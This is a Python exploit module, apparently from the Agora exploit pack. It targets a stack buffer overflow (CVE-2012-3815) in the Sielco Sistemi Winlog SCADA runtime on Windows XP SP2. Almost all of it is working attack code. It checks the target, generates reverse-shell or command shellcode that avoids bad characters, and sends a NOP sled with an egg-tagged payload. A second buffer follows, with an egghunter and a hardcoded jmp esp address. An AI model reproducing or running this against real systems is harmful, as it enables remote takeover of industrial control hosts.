#!/usr/bin/env python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution
# immunity debugger !mona egg -t EaST

import sys
import re
import os
import socket
from time import sleep

sys.path.append("./core")
sys.path.append("./shellcodes")
from Shellcodes import OSShellcodes
from Sploit import Sploit

INFO={}
INFO['NAME']="ef_winlog_sbo"
INFO['DESCRIPTION']="Winlog runtime stack based buffer overflow"
INFO['VENDOR']="http://www.sielcosistemi.com/en/download/public/winlog_lite.html"
INFO["CVE Name"]="2012-3815"
INFO["NOTES"]="""
    Stack buffer overflow
    Tested on win xp sp2 Sielco Sistemi Winlog 2.07.14
    """
INFO['CHANGELOG']="28 Sept, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.118"
OPTIONS["PORT"] = "46824"

class exploit(Sploit):

    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = OPTIONS["PORT"]
        self.host = OPTIONS["HOST"]
        self.name = INFO['NAME']
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return

    def check(self):
        self.args()
        """
          Quicky banner check
        """
        #self.setInfo( "%s attacking %s:%d - Running" % ( NAME, self.host, self.port ) )
        self.log( "Testing %s:%d" % ( self.host, self.port ) )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
        except socket.error, msg:
            self.log("Error : %s"%msg)
            return 0
        s.close()
        return 1

    def get_sc(self):
        self.BADCHARS = ["\x00", "\x09", "\x0A", "\x20"]
        self.log("shell creating...")
        self.CONNECTBACK_IP = socket.gethostbyname(socket.gethostname())
        if self.args['listener']:
            shellcode_type = 'reverse'
            port = int(self.args['listener']['PORT'])
        else:
            port = 9999
            shellcode_type = 'command'
        self.CONNECTBACK_PORT = port
        os_system = os_target = 'WINDOWS'
        os_arch = '32bit'
        s = OSShellcodes(os_target, os_arch, self.CONNECTBACK_IP, self.CONNECTBACK_PORT, self.BADCHARS)
        shellcode = s.create_shellcode(
            shellcode_type,
            encode=1,
            debug=0
        )
        if shellcode:
            self.shellcode = shellcode
            return 1
        else:
            return 0

    def run(self):
        if not self.check():
            self.log( "Testing didn't find vulnerable target" )
            #self.setInfo( "%s attacking %s:%d - (Failed!)" % ( NAME, self.host, self.port ), showlog = 1 )
            self.finish(False)
            return 0
        if not self.get_sc():
            self.log( "Failed when creating shellcode" )
            #self.setInfo( "%s attacking %s:%d - (Failed!)" % ( NAME, self.host, self.port ), showlog = 1 )
            self.finish(False)
            return 0
        egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        egg +="\xef\xb8\x45\x61\x53\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        BUF = 4357
        buff = "\x90" * 2000
        buff += "EaSTEaST" # jmp esp ntdll xp sp2
        buff += self.shellcode
        buff += "\x90"*(4-len(self.shellcode)%4)
        buff += "\x90"*(BUF-(len(buff)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.sendall(buff)
        sleep(5)
        self.log("Send payload now waiting for 5 seconds")
        buff = "\x41" * 20 + "\x14" * 10 + "\x41" * 151
        buff += "\xED\x1E\x94\x7C" # jmp esp ntdll xp sp2
        buff += "\x90" + egg + "\x90"*(59-len(egg))
        s.sendall(buff)
        self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
